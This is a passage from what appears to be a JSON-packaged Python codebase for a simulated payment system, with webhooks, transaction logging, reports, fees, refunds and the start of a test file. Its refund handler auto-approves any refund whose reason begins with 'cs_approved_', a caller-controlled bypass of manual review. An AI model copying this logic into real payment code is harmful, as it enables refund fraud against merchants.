          failed += 1\n                    \n        return {\n            \""status\"": \""processed\"",\n            \""event_id\"": event['id'],\n            \""endpoints_notified\"": successful,\n            \""endpoints_failed\"": failed\n        }\n    \n    def _send_webhook(self, endpoint: Dict, event: Dict) -> Dict:\n        # Simulate webhook sending\n        signature = self._generate_signature(event['payload'])\n        \n        attempt = {\n            'endpoint': endpoint['url'],\n            'timestamp': datetime.datetime.now(),\n            'signature': signature\n        }\n        \n        # Simulate success/failure based on endpoint URL\n        if 'fail' in endpoint['url']:\n            attempt['status'] = 'failed'\n            attempt['error'] = 'Connection timeout'\n            endpoint['failure_count'] += 1\n            \n            if endpoint['failure_count'] >= self.retry_limits['max_retries']:\n                endpoint['active'] = False\n                \n            return {'success': False, 'error': attempt['error']}\n        else:\n            attempt['status'] = 'success'\n            attempt['response_code'] = 200\n            endpoint['failure_count'] = 0  # Reset on success\n            \n            return {'success': True}\n    \n    def _generate_event_id(self) -> str:\n        timestamp = datetime.datetime.now().isoformat()\n        return hashlib.md5(timestamp.encode()).hexdigest()[:12]\n    \n    def _generate_signature(self, payload: Dict) -> str:\n        payload_string = json.dumps(payload, sort_keys=True)\n        return hmac.new(\n            self.secret_key.encode(),\n            payload_string.encode(),\n            hashlib.sha256\n        ).hexdigest()\n    \n    def get_failed_events(self, hours: int = 24) -> List[Dict]:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(hours=hours)\n        failed_events = []\n        \n        for event in self.event_queue:\n            if event['timestamp'] > cutoff_time:\n                has_failures = any(\n                    attempt.get('status') == 'failed' \n                    for attempt in event.get('attempts', [])\n                )\n                if has_failures:\n                    failed_events.append({\n                        'event_id': event['id'],\n                        'type': event['type'],\n                        'timestamp': event['timestamp'].isoformat(),\n                        'failure_count': sum(1 for a in event.get('attempts', []) \n                                           if a.get('status') == 'failed')\n                    })\n                    \n        return failed_events\n    \n    def retry_failed_events(self) -> Dict:\n        retried = 0\n        skipped = 0\n        \n        for event in self.event_queue:\n            # Check if event needs retry\n            failed_attempts = [a for a in event.get('attempts', []) \n                             if a.get('status') == 'failed']\n            \n            if failed_attempts and len(failed_attempts) < self.retry_limits['max_retries']:\n                # Retry logic would go here\n                retried += 1\n            elif len(failed_attempts) >= self.retry_limits['max_retries']:\n                skipped += 1\n                \n        return {\n            'retried': retried,\n            'skipped': skipped,\n            'total_events': len(self.event_queue)\n        }\n    \n    def get_endpoint_health(self) -> Dict:\n        health_report = {}\n        \n        for event_type, endpoints in self.endpoints.items():\n            active_count = sum(1 for ep in endpoints if ep['active'])\n            inactive_count = len(endpoints) - active_count\n            \n            health_report[event_type] = {\n                'total_endpoints': len(endpoints),\n                'active': active_count,\n                'inactive': inactive_count,\n                'health_percentage': (active_count / len(endpoints) * 100) if endpoints else 0\n            }\n            \n        return health_report\n    \n    def deactivate_endpoint(self, event_type: str, url: str) -> Dict:\n        if event_type not in self.endpoints:\n            return {\""status\"": \""error\"", \""message\"": \""Event type not found\""}\n            \n        for endpoint in self.endpoints[event_type]:\n            if endpoint['url'] == url:\n                endpoint['active'] = False\n                endpoint['deactivated_at'] = datetime.datetime.now()\n                return {\""status\"": \""success\"", \""message\"": \""Endpoint deactivated\""}\n                \n        return {\""status\"": \""error\"", \""message\"": \""Endpoint not found\""}\n    \n    def cleanup_old_events(self, days: int = 7) -> int:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(days=days)\n        original_count = len(self.event_queue)\n        \n        self.event_queue = [\n            event for event in self.event_queue \n            if event['timestamp'] > cutoff_time\n        ]\n        \n        return original_count - len(self.event_queue)"", ""transaction_logger.py"": ""import json\nimport datetime\nfrom typing import Dict, List, Optional\nfrom decimal import Decimal\n\n\nclass TransactionLogger:\n    def __init__(self, log_file: str = \""transactions.log\""):\n        self.log_file = log_file\n        self.buffer = []\n        self.buffer_size = 100\n        \n    def log_transaction(self, transaction_data: Dict) -> bool:\n        try:\n            log_entry = {\n                'timestamp': datetime.datetime.now().isoformat(),\n                'transaction_id': transaction_data.get('transaction_id'),\n                'amount': str(transaction_data.get('amount', 0)),\n                'status': transaction_data.get('status'),\n                'card_last_four': transaction_data.get('card_number', '')[-4:] if transaction_data.get('card_number') else None,\n                'merchant_id': transaction_data.get('merchant_id'),\n                'metadata': transaction_data.get('metadata', {})\n            }\n            \n            self.buffer.append(log_entry)\n            \n            # Flush buffer if full\n            if len(self.buffer) >= self.buffer_size:\n                return self.flush_buffer()\n                \n            return True\n            \n        except Exception:\n            return False\n    \n    def flush_buffer(self) -> bool:\n        if not self.buffer:\n            return True\n            \n        try:\n            with open(self.log_file, 'a') as f:\n                for entry in self.buffer:\n                    f.write(json.dumps(entry) + '\\n')\n            self.buffer = []\n            return True\n        except Exception:\n            return False\n    \n    def search_by_transaction_id(self, transaction_id: str) -> Optional[Dict]:\n        try:\n            with open(self.log_file, 'r') as f:\n                for line in f:\n                    entry = json.loads(line.strip())\n                    if entry.get('transaction_id') == transaction_id:\n                        return entry\n            return None\n        except Exception:\n            return None\n    \n    def get_transactions_by_date(self, date: datetime.date) -> List[Dict]:\n        transactions = []\n        try:\n            with open(self.log_file, 'r') as f:\n                for line in f:\n                    entry = json.loads(line.strip())\n                    entry_date = datetime.datetime.fromisoformat(entry['timestamp']).date()\n                    if entry_date == date:\n                        transactions.append(entry)\n        except Exception:\n            pass\n        return transactions\n    \n    def calculate_daily_totals(self, date: datetime.date) -> Dict:\n        transactions = self.get_transactions_by_date(date)\n        \n        total_amount = Decimal('0')\n        successful_count = 0\n        failed_count = 0\n        \n        for trans in transactions:\n            if trans.get('status') == 'success':\n                successful_count += 1\n                total_amount += Decimal(trans.get('amount', '0'))\n            else:\n                failed_count += 1\n                \n        return {\n            'date': date.isoformat(),\n            'total_transactions': len(transactions),\n            'successful': successful_count,\n            'failed': failed_count,\n            'total_amount': str(total_amount),\n            'success_rate': successful_count / len(transactions) if transactions else 0\n        }\n    \n    def export_to_csv(self, start_date: datetime.date, end_date: datetime.date, \n                     output_file: str) -> bool:\n        try:\n            import csv\n            \n            transactions = []\n            with open(self.log_file, 'r') as f:\n                for line in f:\n                    entry = json.loads(line.strip())\n                    entry_date = datetime.datetime.fromisoformat(entry['timestamp']).date()\n                    if start_date <= entry_date <= end_date:\n                        transactions.append(entry)\n                        \n            if not transactions:\n                return False\n                \n            with open(output_file, 'w', newline='') as csvfile:\n                fieldnames = ['timestamp', 'transaction_id', 'amount', 'status', \n                            'card_last_four', 'merchant_id']\n                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n                \n                writer.writeheader()\n                for trans in transactions:\n                    row = {k: trans.get(k, '') for k in fieldnames}\n                    writer.writerow(row)\n                    \n            return True\n            \n        except Exception:\n            return False\n    \n    def get_error_transactions(self, limit: int = 100) -> List[Dict]:\n        errors = []\n        try:\n            with open(self.log_file, 'r') as f:\n                for line in f:\n                    if len(errors) >= limit:\n                        break\n                    entry = json.loads(line.strip())\n                    if entry.get('status') != 'success':\n                        errors.append(entry)\n        except Exception:\n            pass\n        return errors\n    \n    def archive_old_logs(self, days_to_keep: int = 90) -> Dict:\n        cutoff_date = datetime.datetime.now() - datetime.timedelta(days=days_to_keep)\n        archive_file = f\""archive_{datetime.date.today().isoformat()}.log\""\n        \n        kept_entries = []\n        archived_count = 0\n        \n        try:\n            # Read all entries\n            with open(self.log_file, 'r') as f:\n                for line in f:\n                    entry = json.loads(line.strip())\n                    entry_time = datetime.datetime.fromisoformat(entry['timestamp'])\n                    \n                    if entry_time > cutoff_date:\n                        kept_entries.append(entry)\n                    else:\n                        # Write to archive\n                        with open(archive_file, 'a') as archive:\n                            archive.write(line)\n                        archived_count += 1\n                        \n            # Rewrite main log with only recent entries\n            with open(self.log_file, 'w') as f:\n                for entry in kept_entries:\n                    f.write(json.dumps(entry) + '\\n')\n                    \n            return {\n                'archived': archived_count,\n                'kept': len(kept_entries),\n                'archive_file': archive_file\n            }\n            \n        except Exception:\n            return {'error': 'Archive operation failed'}"", ""utils.py"": ""import datetime\nimport hashlib\nimport random\nimport string\nfrom decimal import Decimal\nfrom typing import Any, Dict, List, Optional\n\n\ndef generate_transaction_id() -> str:\n    \""\""\""Generate a unique transaction ID.\""\""\""\n    timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')\n    random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))\n    return f\""TXN{timestamp}{random_suffix}\""\n\n\ndef validate_email(email: str) -> bool:\n    \""\""\""Basic email validation.\""\""\""\n    import re\n    pattern = r'^[\\w\\.-]+@[\\w\\.-]+\\.\\w+$'\n    return bool(re.match(pattern, email))\n\n\ndef format_currency(amount: Decimal, currency: str = 'USD') -> str:\n    \""\""\""Format decimal amount as currency string.\""\""\""\n    if currency == 'USD':\n        return f\""${amount:,.2f}\""\n    elif currency == 'EUR':\n        return f\""\u20ac{amount:,.2f}\""\n    elif currency == 'GBP':\n        return f\""\u00a3{amount:,.2f}\""\n    else:\n        return f\""{currency} {amount:,.2f}\""\n\n\ndef calculate_percentage(part: Decimal, whole: Decimal) -> Decimal:\n    \""\""\""Calculate percentage with proper handling of zero division.\""\""\""\n    if whole == 0:\n        return Decimal('0')\n    return (part / whole) * 100\n\n\ndef mask_card_number(card_number: str) -> str:\n    \""\""\""Mask card number showing only last 4 digits.\""\""\""\n    if len(card_number) < 8:\n        return \""****\""\n    return f\""****{card_number[-4:]}\""\n\n\ndef is_business_day(date: datetime.date) -> bool:\n    \""\""\""Check if a date is a business day (Mon-Fri).\""\""\""\n    return date.weekday() < 5\n\n\ndef get_next_business_day(date: datetime.date) -> datetime.date:\n    \""\""\""Get the next business day after the given date.\""\""\""\n    next_day = date + datetime.timedelta(days=1)\n    while not is_business_day(next_day):\n        next_day += datetime.timedelta(days=1)\n    return next_day\n\n\ndef calculate_hash(data: str) -> str:\n    \""\""\""Calculate SHA256 hash of string data.\""\""\""\n    return hashlib.sha256(data.encode()).hexdigest()\n\n\ndef paginate_list(items: List[Any], page: int = 1, \n                 page_size: int = 10) -> Dict[str, Any]:\n    \""\""\""Paginate a list of items.\""\""\""\n    total_items = len(items)\n    total_pages = (total_items + page_size - 1) // page_size\n    \n    start_idx = (page - 1) * page_size\n    end_idx = start_idx + page_size\n    \n    return {\n        'items': items[start_idx:end_idx],\n        'page': page,\n        'page_size': page_size,\n        'total_items': total_items,\n        'total_pages': total_pages,\n        'has_next': page < total_pages,\n        'has_previous': page > 1\n    }\n\n\ndef sanitize_input(text: str) -> str:\n    \""\""\""Basic input sanitization.\""\""\""\n    # Remove control characters\n    import unicodedata\n    text = ''.join(ch for ch in text if unicodedata.category(ch)[0] != 'C')\n    # Trim whitespace\n    return text.strip()\n\n\ndef generate_api_response(status: str, data: Optional[Dict] = None, \n                         error: Optional[str] = None) -> Dict:\n    \""\""\""Generate standardized API response.\""\""\""\n    response = {\n        'status': status,\n        'timestamp': datetime.datetime.now().isoformat()\n    }\n    \n    if data is not None:\n        response['data'] = data\n        \n    if error is not None:\n        response['error'] = error\n        \n    return response\n\n\ndef calculate_date_range_stats(dates: List[datetime.date]) -> Dict:\n    \""\""\""Calculate statistics for a list of dates.\""\""\""\n    if not dates:\n        return {\n            'count': 0,\n            'earliest': None,\n            'latest': None,\n            'range_days': 0\n        }\n        \n    sorted_dates = sorted(dates)\n    \n    return {\n        'count': len(dates),\n        'earliest': sorted_dates[0].isoformat(),\n        'latest': sorted_dates[-1].isoformat(),\n        'range_days': (sorted_dates[-1] - sorted_dates[0]).days\n    }\n\n\ndef validate_amount(amount: Any, min_amount: Decimal = Decimal('0.01'),\n                   max_amount: Decimal = Decimal('999999.99')) -> bool:\n    \""\""\""Validate monetary amount.\""\""\""\n    try:\n        decimal_amount = Decimal(str(amount))\n        return min_amount <= decimal_amount <= max_amount\n    except:\n        return False\n\n\ndef chunk_list(items: List[Any], chunk_size: int) -> List[List[Any]]:\n    \""\""\""Split a list into chunks of specified size.\""\""\""\n    return [items[i:i + chunk_size] for i in range(0, len(items), chunk_size)]"", ""report_generator.py"": ""from decimal import Decimal\nfrom typing import Dict, List, Optional\nimport datetime\nimport json\nimport csv\n\n\nclass ReportGenerator:\n    def __init__(self):\n        self.report_templates = {\n            'daily_summary': self._generate_daily_summary,\n            'merchant_activity': self._generate_merchant_activity,\n            'fraud_analysis': self._generate_fraud_analysis,\n            'revenue_report': self._generate_revenue_report\n        }\n        self.generated_reports = []\n        \n    def generate_report(self, report_type: str, parameters: Dict) -> Dict:\n        if report_type not in self.report_templates:\n            return {\""status\"": \""error\"", \""message\"": \""Unknown report type\""}\n            \n        try:\n            report_data = self.report_templates[report_type](parameters)\n            \n            report = {\n                'id': self._generate_report_id(),\n                'type': report_type,\n                'generated_at': datetime.datetime.now(),\n                'parameters': parameters,\n                'data': report_data\n            }\n            \n            self.generated_reports.append(report)\n            \n            return {\n                \""status\"": \""success\"",\n                \""report_id\"": report['id'],\n                \""data\"": report_data\n            }\n            \n        except Exception as e:\n            return {\""status\"": \""error\"", \""message\"": str(e)}\n    \n    def _generate_report_id(self) -> str:\n        return f\""RPT{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}\""\n    \n    def _generate_daily_summary(self, params: Dict) -> Dict:\n        date = params.get('date', datetime.date.today())\n        \n        # Simulated data\n        return {\n            'date': str(date),\n            'total_transactions': 1543,\n            'successful_transactions': 1489,\n            'failed_transactions': 54,\n            'total_volume': '125432.50',\n            'average_transaction': '81.29',\n            'peak_hour': '14:00',\n            'peak_hour_transactions': 234,\n            'unique_merchants': 89,\n            'new_customers': 23\n        }\n    \n    def _generate_merchant_activity(self, params: Dict) -> Dict:\n        merchant_id = params.get('merchant_id')\n        start_date = params.get('start_date', datetime.date.today() - datetime.timedelta(days=7))\n        end_date = params.get('end_date', datetime.date.today())\n        \n        # Simulated data\n        daily_activity = []\n        current_date = start_date\n        \n        while current_date <= end_date:\n            daily_activity.append({\n                'date': str(current_date),\n                'transactions': 45 + (current_date.day % 20),\n                'volume': str(Decimal('3500') + Decimal(current_date.day * 100)),\n                'average': str(Decimal('77.78'))\n            })\n            current_date += datetime.timedelta(days=1)\n            \n        return {\n            'merchant_id': merchant_id,\n            'period': f\""{start_date} to {end_date}\"",\n            'total_transactions': sum(d['transactions'] for d in daily_activity),\n            'total_volume': str(sum(Decimal(d['volume']) for d in daily_activity)),\n            'daily_activity': daily_activity,\n            'top_products': [\n                {'name': 'Premium Plan', 'count': 234, 'revenue': '23400.00'},\n                {'name': 'Basic Plan', 'count': 456, 'revenue': '13680.00'},\n                {'name': 'Add-on Service', 'count': 123, 'revenue': '2460.00'}\n            ]\n        }\n    \n    def _generate_fraud_analysis(self, params: Dict) -> Dict:\n        period_days = params.get('days', 30)\n        \n        # Simulated data\n        return {\n            'period_days': period_days,\n            'total_transactions_analyzed': 45678,\n            'flagged_transactions': 234,\n            'confirmed_fraud': 45,\n            'false_positives': 189,\n            'fraud_rate': '0.098%',\n            'detection_accuracy': '80.77%',\n            'top_fraud_types': [\n                {'type': 'Card testing', 'count': 23, 'amount': '115.00'},\n                {'type': 'Velocity abuse', 'count': 12, 'amount': '8934.00'},\n                {'type': 'Geographic anomaly', 'count': 10, 'amount': '5623.00'}\n            ],\n            'blocked_ips': 34,\n            'blacklisted_cards': 12\n        }\n    \n    def _generate_revenue_report(self, params: Dict) -> Dict:\n        start_date = params.get('start_date', datetime.date.today() - datetime.timedelta(days=30))\n        end_date = params.get('end_date', datetime.date.today())\n        \n        # Simulated data\n        total_revenue = Decimal('0')\n        fee_breakdown = {\n            'transaction_fees': Decimal('12345.67'),\n            'monthly_fees': Decimal('8900.00'),\n            'international_fees': Decimal('2345.89'),\n            'high_risk_fees': Decimal('1234.56')\n        }\n        \n        total_revenue = sum(fee_breakdown.values())\n        \n        return {\n            'period': f\""{start_date} to {end_date}\"",\n            'total_revenue': str(total_revenue),\n            'fee_breakdown': {k: str(v) for k, v in fee_breakdown.items()},\n            'revenue_by_merchant_tier': {\n                'default': '15234.56',\n                'premium': '9456.78',\n                'enterprise': '890.78'\n            },\n            'refunds_issued': '2345.67',\n            'net_revenue': str(total_revenue - Decimal('2345.67')),\n            'growth_rate': '12.5%'\n        }\n    \n    def export_report(self, report_id: str, format: str = 'json', \n                     output_file: Optional[str] = None) -> Dict:\n        report = None\n        for r in self.generated_reports:\n            if r['id'] == report_id:\n                report = r\n                break\n                \n        if not report:\n            return {\""status\"": \""error\"", \""message\"": \""Report not found\""}\n            \n        if format == 'json':\n            content = json.dumps(report['data'], indent=2)\n        elif format == 'csv':\n            # Simplified CSV export\n            content = self._convert_to_csv(report['data'])\n        else:\n            return {\""status\"": \""error\"", \""message\"": \""Unsupported format\""}\n            \n        if output_file:\n            try:\n                with open(output_file, 'w') as f:\n                    f.write(content)\n                return {\""status\"": \""success\"", \""file\"": output_file}\n            except Exception as e:\n                return {\""status\"": \""error\"", \""message\"": str(e)}\n        else:\n            return {\""status\"": \""success\"", \""content\"": content}\n    \n    def _convert_to_csv(self, data: Dict) -> str:\n        # Simple key-value CSV conversion\n        lines = []\n        for key, value in data.items():\n            if isinstance(value, (str, int, float)):\n                lines.append(f\""{key},{value}\"")\n            elif isinstance(value, dict):\n                for subkey, subvalue in value.items():\n                    lines.append(f\""{key}.{subkey},{subvalue}\"")\n                    \n        return '\\n'.join(lines)\n    \n    def schedule_report(self, report_type: str, parameters: Dict, \n                       frequency: str) -> Dict:\n        valid_frequencies = ['daily', 'weekly', 'monthly']\n        \n        if frequency not in valid_frequencies:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid frequency\""}\n            \n        schedule_id = f\""SCH{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}\""\n        \n        # In a real system, this would set up actual scheduling\n        return {\n            \""status\"": \""success\"",\n            \""schedule_id\"": schedule_id,\n            \""report_type\"": report_type,\n            \""frequency\"": frequency,\n            \""next_run\"": self._calculate_next_run(frequency)\n        }\n    \n    def _calculate_next_run(self, frequency: str) -> str:\n        now = datetime.datetime.now()\n        \n        if frequency == 'daily':\n            next_run = now + datetime.timedelta(days=1)\n        elif frequency == 'weekly':\n            next_run = now + datetime.timedelta(weeks=1)\n        else:  # monthly\n            next_run = now + datetime.timedelta(days=30)\n            \n        return next_run.strftime('%Y-%m-%d %H:%M:%S')\n    \n    def get_available_reports(self) -> List[Dict]:\n        return [\n            {\n                'type': 'daily_summary',\n                'description': 'Daily transaction summary and metrics',\n                'parameters': ['date']\n            },\n            {\n                'type': 'merchant_activity',\n                'description': 'Merchant-specific activity report',\n                'parameters': ['merchant_id', 'start_date', 'end_date']\n            },\n            {\n                'type': 'fraud_analysis',\n                'description': 'Fraud detection and prevention metrics',\n                'parameters': ['days']\n            },\n            {\n                'type': 'revenue_report',\n                'description': 'Revenue and fee analysis',\n                'parameters': ['start_date', 'end_date']\n            }\n        ]"", ""fee_calculator.py"": ""from decimal import Decimal\nfrom typing import Dict, Optional, Tuple\nimport datetime\n\n\nclass FeeCalculator:\n    def __init__(self):\n        self.base_fee = Decimal('0.029')  # 2.9%\n        self.fixed_fee = Decimal('0.30')   # 30 cents\n        self.volume_discounts = {\n            10000: Decimal('0.025'),   # 2.5% for volume > $10k\n            50000: Decimal('0.022'),   # 2.2% for volume > $50k\n            100000: Decimal('0.020')   # 2.0% for volume > $100k\n        }\n        self.international_fee = Decimal('0.015')  # Additional 1.5%\n        self.high_risk_fee = Decimal('0.01')      # Additional 1%\n        \n    def calculate_fee(self, amount: Decimal, is_international: bool = False, \n                     is_high_risk: bool = False, monthly_volume: Optional[Decimal] = None) -> Dict:\n        if amount <= 0:\n            return {\""fee\"": Decimal('0'), \""error\"": \""Invalid amount\""}\n            \n        # Get percentage rate based on volume\n        percentage_rate = self._get_volume_rate(monthly_volume)\n        \n        # Add international fee if applicable\n        if is_international:\n            percentage_rate += self.international_fee\n            \n        # Add high risk fee if applicable  \n        if is_high_risk:\n            percentage_rate += self.high_risk_fee\n            \n        # Calculate total fee\n        percentage_fee = amount * percentage_rate\n        total_fee = percentage_fee + self.fixed_fee\n        \n        # Apply minimum fee\n        if total_fee < Decimal('0.50'):\n            total_fee = Decimal('0.50')\n            \n        return {\n            \""fee\"": total_fee,\n            \""percentage_fee\"": percentage_fee,\n            \""fixed_fee\"": self.fixed_fee,\n            \""effective_rate\"": total_fee / amount if amount > 0 else Decimal('0')\n        }\n    \n    def _get_volume_rate(self, monthly_volume: Optional[Decimal]) -> Decimal:\n        if monthly_volume is None:\n            return self.base_fee\n            \n        # Find applicable discount\n        for threshold, rate in sorted(self.volume_discounts.items(), reverse=True):\n            if monthly_volume >= threshold:\n                return rate\n                \n        return self.base_fee\n    \n    def calculate_batch_fees(self, transactions: list) -> Dict:\n        total_fees = Decimal('0')\n        total_amount = Decimal('0')\n        fee_breakdown = []\n        \n        for transaction in transactions:\n            amount = transaction.get('amount', Decimal('0'))\n            is_intl = transaction.get('international', False)\n            is_risk = transaction.get('high_risk', False)\n            \n            fee_result = self.calculate_fee(amount, is_intl, is_risk)\n            total_fees += fee_result['fee']\n            total_amount += amount\n            \n            fee_breakdown.append({\n                'amount': amount,\n                'fee': fee_result['fee'],\n                'international': is_intl,\n                'high_risk': is_risk\n            })\n            \n        return {\n            'total_fees': total_fees,\n            'total_amount': total_amount,\n            'average_fee': total_fees / len(transactions) if transactions else Decimal('0'),\n            'effective_rate': total_fees / total_amount if total_amount > 0 else Decimal('0'),\n            'breakdown': fee_breakdown\n        }\n    \n    def estimate_monthly_fees(self, daily_transactions: int, average_amount: Decimal) -> Dict:\n        # Estimate based on 30 days\n        monthly_volume = daily_transactions * average_amount * 30\n        monthly_transactions = daily_transactions * 30\n        \n        # Get applicable rate\n        rate = self._get_volume_rate(monthly_volume)\n        \n        # Calculate fees\n        percentage_fees = monthly_volume * rate\n        fixed_fees = self.fixed_fee * monthly_transactions\n        total_fees = percentage_fees + fixed_fees\n        \n        return {\n            'estimated_volume': monthly_volume,\n            'estimated_transactions': monthly_transactions,\n            'estimated_fees': total_fees,\n            'effective_rate': total_fees / monthly_volume if monthly_volume > 0 else Decimal('0'),\n            'applied_rate': rate\n        }\n    \n    def calculate_refund_fee(self, original_amount: Decimal, refund_amount: Decimal,\n                           days_since_transaction: int) -> Dict:\n        if refund_amount > original_amount:\n            return {\""fee\"": Decimal('0'), \""error\"": \""Refund exceeds original amount\""}\n            \n        if days_since_transaction < 0:\n            return {\""fee\"": Decimal('0'), \""error\"": \""Invalid days\""}\n            \n        # Full refund within 7 days - no fee\n        if refund_amount == original_amount and days_since_transaction <= 7:\n            return {\""fee\"": Decimal('0'), \""type\"": \""full_refund\""}\n            \n        # Partial refund or after 7 days - fixed fee\n        if days_since_transaction > 7 or refund_amount < original_amount:\n            return {\""fee\"": Decimal('5.00'), \""type\"": \""partial_or_late_refund\""}\n            \n        return {\""fee\"": Decimal('0'), \""type\"": \""standard_refund\""}\n    \n    def get_fee_summary(self, start_date: datetime.date, end_date: datetime.date,\n                       transactions: list) -> Dict:\n        period_transactions = []\n        for trans in transactions:\n            trans_date = trans.get('date')\n            if start_date <= trans_date <= end_date:\n                period_transactions.append(trans)\n                \n        if not period_transactions:\n            return {\n                'period': f\""{start_date} to {end_date}\"",\n                'total_fees': Decimal('0'),\n                'transaction_count': 0\n            }\n            \n        result = self.calculate_batch_fees(period_transactions)\n        result['period'] = f\""{start_date} to {end_date}\""\n        result['transaction_count'] = len(period_transactions)\n        \n        return result"", ""refund_handler.py"": ""from decimal import Decimal\nfrom typing import Dict, Optional, List\nimport datetime\nimport uuid\n\n\nclass RefundHandler:\n    def __init__(self):\n        self.refunds = {}\n        self.refund_limits = {\n            'daily_amount': Decimal('10000'),\n            'daily_count': 50,\n            'max_age_days': 180\n        }\n        \n    def process_refund(self, transaction_id: str, original_amount: Decimal, \n                      refund_amount: Decimal, reason: str) -> Dict:\n        # Validate refund amount\n        if refund_amount <= 0:\n            return {\""status\"": \""failed\"", \""error\"": \""Invalid refund amount\""}\n            \n        if refund_amount > original_amount:\n            return {\""status\"": \""failed\"", \""error\"": \""Refund exceeds original amount\""}\n            \n        # Check refund limits\n        limit_check = self._check_daily_limits(refund_amount)\n        if not limit_check['allowed']:\n            return {\""status\"": \""failed\"", \""error\"": limit_check['reason']}\n            \n        # Create refund record\n        refund_id = self._generate_refund_id()\n        refund_record = {\n            'id': refund_id,\n            'transaction_id': transaction_id,\n            'original_amount': original_amount,\n            'refund_amount': refund_amount,\n            'reason': reason,\n            'status': 'pending',\n            'created_at': datetime.datetime.now(),\n            'processed_at': None\n        }\n        \n        self.refunds[refund_id] = refund_record\n        \n        # Process based on amount and reason\n        if self._should_auto_approve(refund_amount, reason):\n            return self._approve_refund(refund_id)\n        else:\n            return {\n                \""status\"": \""pending_review\"",\n                \""refund_id\"": refund_id,\n                \""message\"": \""Refund requires manual review\""\n            }\n    \n    def _check_daily_limits(self, amount: Decimal) -> Dict:\n        today = datetime.date.today()\n        daily_total = Decimal('0')\n        daily_count = 0\n        \n        for refund in self.refunds.values():\n            if refund['created_at'].date() == today and refund['status'] != 'rejected':\n                daily_total += refund['refund_amount']\n                daily_count += 1\n                \n        if daily_total + amount > self.refund_limits['daily_amount']:\n            return {'allowed': False, 'reason': 'Daily refund amount limit exceeded'}\n            \n        if daily_count >= self.refund_limits['daily_count']:\n            return {'allowed': False, 'reason': 'Daily refund count limit exceeded'}\n            \n        return {'allowed': True}\n    \n    def _should_auto_approve(self, amount: Decimal, reason: str) -> bool:\n        # Auto-approve small refunds with valid reasons\n        if amount <= Decimal('50') and reason in ['duplicate_charge', 'technical_error']:\n            return True\n            \n        # Auto-approve if customer service tagged\n        if reason.startswith('cs_approved_'):\n            return True\n            \n        return False\n    \n    def _generate_refund_id(self) -> str:\n        return f\""REF{uuid.uuid4().hex[:8].upper()}\""\n    \n    def _approve_refund(self, refund_id: str) -> Dict:\n        if refund_id not in self.refunds:\n            return {\""status\"": \""failed\"", \""error\"": \""Refund not found\""}\n            \n        refund = self.refunds[refund_id]\n        refund['status'] = 'approved'\n        refund['processed_at'] = datetime.datetime.now()\n        \n        return {\n            \""status\"": \""approved\"",\n            \""refund_id\"": refund_id,\n            \""amount\"": str(refund['refund_amount']),\n            \""message\"": \""Refund approved and processing\""\n        }\n    \n    def reject_refund(self, refund_id: str, reason: str) -> Dict:\n        if refund_id not in self.refunds:\n            return {\""status\"": \""failed\"", \""error\"": \""Refund not found\""}\n            \n        refund = self.refunds[refund_id]\n        if refund['status'] != 'pending':\n            return {\""status\"": \""failed\"", \""error\"": \""Refund already processed\""}\n            \n        refund['status'] = 'rejected'\n        refund['processed_at'] = datetime.datetime.now()\n        refund['rejection_reason'] = reason\n        \n        return {\n            \""status\"": \""rejected\"",\n            \""refund_id\"": refund_id,\n            \""reason\"": reason\n        }\n    \n    def get_refund_status(self, refund_id: str) -> Optional[Dict]:\n        if refund_id not in self.refunds:\n            return None\n            \n        refund = self.refunds[refund_id]\n        return {\n            'refund_id': refund_id,\n            'status': refund['status'],\n            'amount': str(refund['refund_amount']),\n            'created_at': refund['created_at'].isoformat(),\n            'processed_at': refund['processed_at'].isoformat() if refund['processed_at'] else None\n        }\n    \n    def get_pending_refunds(self) -> List[Dict]:\n        pending = []\n        for refund_id, refund in self.refunds.items():\n            if refund['status'] == 'pending':\n                pending.append({\n                    'refund_id': refund_id,\n                    'amount': str(refund['refund_amount']),\n                    'reason': refund['reason'],\n                    'age_hours': (datetime.datetime.now() - refund['created_at']).total_seconds() / 3600\n                })\n        return sorted(pending, key=lambda x: x['age_hours'], reverse=True)\n    \n    def batch_approve_refunds(self, refund_ids: List[str]) -> Dict:\n        approved = []\n        failed = []\n        \n        for refund_id in refund_ids:\n            result = self._approve_refund(refund_id)\n            if result['status'] == 'approved':\n                approved.append(refund_id)\n            else:\n                failed.append({'refund_id': refund_id, 'error': result.get('error')})\n                \n        return {\n            'approved_count': len(approved),\n            'failed_count': len(failed),\n            'approved': approved,\n            'failed': failed\n        }\n    \n    def get_refund_metrics(self, days: int = 30) -> Dict:\n        cutoff_date = datetime.datetime.now() - datetime.timedelta(days=days)\n        \n        total_refunds = 0\n        total_amount = Decimal('0')\n        approved_count = 0\n        rejected_count = 0\n        pending_count = 0\n        avg_processing_time = []\n        \n        for refund in self.refunds.values():\n            if refund['created_at'] > cutoff_date:\n                total_refunds += 1\n                total_amount += refund['refund_amount']\n                \n                if refund['status'] == 'approved':\n                    approved_count += 1\n                    if refund['processed_at']:\n                        processing_time = (refund['processed_at'] - refund['created_at']).total_seconds() / 3600\n                        avg_processing_time.append(processing_time)\n                elif refund['status'] == 'rejected':\n                    rejected_count += 1\n                else:\n                    pending_count += 1\n                    \n        return {\n            'period_days': days,\n            'total_refunds': total_refunds,\n            'total_amount': str(total_amount),\n            'approved': approved_count,\n            'rejected': rejected_count,\n            'pending': pending_count,\n            'approval_rate': approved_count / total_refunds if total_refunds > 0 else 0,\n            'average_processing_hours': sum(avg_processing_time) / len(avg_processing_time) if avg_processing_time else 0\n        }"", ""tests/test_utils.py"": ""import pytest\nfrom decimal import Decimal\nimport datetime\nfrom utils import *\n\n\nclass TestUtils:\n    def test_generate_transaction_id(self):\n        id1 = generate_transaction_id()\n        id2 = generate_transaction_id()\n        \n        assert id1.startswith(\""TXN\"")\n        assert len(id1) > 20\n        assert id1 != id2\n    \n    def test_validate_email(self):\n        assert validate_email(\""test@example.com\"") is True\n        assert validate_email(\""user.name@domain.co.uk\"") is True\n        assert validate_email(\""invalid.email\"") is False\n        assert validate_email(\""@example.com\"") is False\n        assert validate_email(\""test@\"") is False\n    \n    def test_format_currency(self):\n        assert format_currency(Decimal(\""1234.56\""), \""USD\"") == \""$1,234.56\""\n        assert format_currency(Decimal(\""1234.56\""), \""EUR\"") == 